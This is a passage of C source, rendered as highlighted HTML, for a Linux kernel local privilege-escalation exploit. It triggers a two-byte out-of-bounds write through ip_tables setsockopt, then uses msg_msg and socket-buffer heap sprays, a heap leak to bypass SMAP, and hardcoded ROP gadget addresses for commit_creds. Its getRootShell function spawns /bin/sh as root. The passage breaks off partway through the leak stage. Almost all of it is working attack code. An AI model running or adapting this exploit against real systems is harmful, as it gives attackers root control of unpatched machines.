class="meta">#<span class="meta-keyword">define</span> SECONDARY_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SOCKETS 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SKBUFFS 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_PIPEFDS 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_MSQIDS 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOLE_STEP 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_PRIMARY 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_SECONDARY 0x42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_FAKE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Gadget </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUSH_RSI_JMP_RSI_0x2E 0xffffffff81b4e244</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_0x98_RET 0xffffffff81a7895e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff81900644</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff81001629</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff8244c8a0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff8108e690</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82019340</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//pt_regs</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKB_SHARED_INFO_SIZE 0x140</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSG_SIZE (sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//some struct</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_next;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_prev;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_type;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_ts;</span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">  <span class="keyword">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> page;</span><br><span class="line">  <span class="keyword">uint32_t</span> offset;</span><br><span class="line">  <span class="keyword">uint32_t</span> len;</span><br><span class="line">  <span class="keyword">uint64_t</span> ops;</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line">  <span class="keyword">uint32_t</span> pad;</span><br><span class="line">  <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">  <span class="keyword">uint64_t</span> release;</span><br><span class="line">  <span class="keyword">uint64_t</span> steal;</span><br><span class="line">  <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PRIMARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_primary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_secondary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];</span><br><span class="line">&#125; msg_fake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_msg_msg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next,</span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="keyword">uint64_t</span> m_list_prev, <span class="keyword">uint64_t</span> m_ts, <span class="keyword">uint64_t</span> next)</span> </span>&#123;</span><br><span class="line">  msg-&gt;m_list_next = m_list_next;</span><br><span class="line">  msg-&gt;m_list_prev = m_list_prev;</span><br><span class="line">  msg-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">  msg-&gt;m_ts = m_ts;</span><br><span class="line">  msg-&gt;next = next;</span><br><span class="line">  msg-&gt;security = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;failed to gain the root!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  *(<span class="keyword">long</span> *)msgp = msgtyp;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgsnd&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peek_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT) &lt;</span><br><span class="line">      <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (write(ss[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">trigger_oob_write</span><span class="params">(<span class="keyword">int</span> s)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>                     <span class="comment">// 0x60</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>                         <span class="comment">// 0x70</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>                    <span class="comment">// 0x20</span></span><br><span class="line">    <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];   <span class="comment">//  kvmalloc_size = sizeof(xt_table_info) + ipt_replace-&gt;size =  0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>                  <span class="comment">// 0x20</span></span><br><span class="line">  &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">  data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">  data.replace.size = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                       <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));             <span class="comment">// 0x70 + (0x108+0x1000-0x200-0x2) + 0x20 + 0x20 = 0xFB8 - 0x2</span></span><br><span class="line"></span><br><span class="line">  data.entry.next_offset = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                            <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));        <span class="comment">// Size of ipt_entry + matches + target</span></span><br><span class="line">  data.entry.target_offset =</span><br><span class="line">      (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));         <span class="comment">// Size of ipt_entry + matches</span></span><br><span class="line"></span><br><span class="line">  data.match.u.user.match_size = (<span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));   <span class="comment">// 0x20 + (0x108+0x1000-0x200-0x2) = 0xF28 - 0x2</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">  data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);                     <span class="comment">// 0x20</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">  data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Partially overwrite the adjacent buffer with 2 bytes of zero.</span></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno == ENOPROTOOPT) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error ip_tables module is not loaded.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//bind the cpu0</span></span><br><span class="line">  <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">  CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">  CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> s;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> pipefd[NUM_PIPEFDS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> msqid[NUM_MSQIDS];</span><br><span class="line">  <span class="keyword">uint64_t</span>    *rop_chain;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line">  <span class="keyword">char</span> secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">fake_pipe_buffer_ops</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">fake_pipe_buffer</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> pipe_buffer_ops = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">uint64_t</span> kheap_addr = <span class="number">0</span>, kbase_addr = <span class="number">0</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> fake_idx = <span class="number">-1</span>, real_idx = <span class="number">-1</span>;</span><br><span class="line">  saveStatus();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 0: Initialization\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Setting up namespace sandbox...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (setup_sandbox() &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Initializing sockets and message queues...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] socket&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, ss[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] socketpair&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1. two bytes null write -&gt; UAF</span></span><br><span class="line"><span class="comment">// 1-1. gain 4096 msg queue</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | <span class="number">0666</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] msgget&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 1: Memory corruption\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">//1-2. create 4096 primary msg â€”â€” size=0x1000</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_primary, <span class="string">&#x27;\xdd&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-3. create 4096 secondary msg â€”â€” size=0x400</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_secondary, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_secondary));</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">                  MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-4. release #1024/#2048/#3072 msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Creating holes in primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = HOLE_STEP; i &lt; NUM_MSQIDS; i += HOLE_STEP) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt;</span><br><span class="line">        <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-5. make xt_table_info struct take up the hole, and triger 2 bytes null write</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering out-of-bounds write...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (trigger_oob_write(s) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1-6. find which msg is corrupted</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Searching for corrupted primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; (i % HOLE_STEP) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] != MSG_TAG) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] != i) &#123;</span><br><span class="line">      fake_idx = i;</span><br><span class="line">      real_idx = *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fake_idx == <span class="number">-1</span> &amp;&amp; real_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_idx&#x27;s primary message has a corrupted next pointer; wrongly pointing to real_idx&#x27;s secondary message.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_idx: 0x%x\n&quot;</span>, fake_idx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] real_idx: 0x%x\n&quot;</span>, real_idx);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 2: SMAP bypass\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 2. leak secondary msg address (kmalloc-0x400) -&gt; to forge `msg_msg-&gt;m_list-&gt;next &amp; prev`</span></span><br><span class="line"><span class="comment">// 2-1. free overlapped msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing real secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[real_idx], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">               MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reclaim the previously freed secondary message with a fake msg_msg of maximum possible size.</span></span><br><span class="line"><span class="comment">// 2-2. spray and forge msg_msg (forge larger msg_msg-&gt;m_ts)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                PAGE_SIZE - MSG_MSG_SIZE, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 2-2. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x1000)</span></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read out-of-bounds.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking adjacent secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) 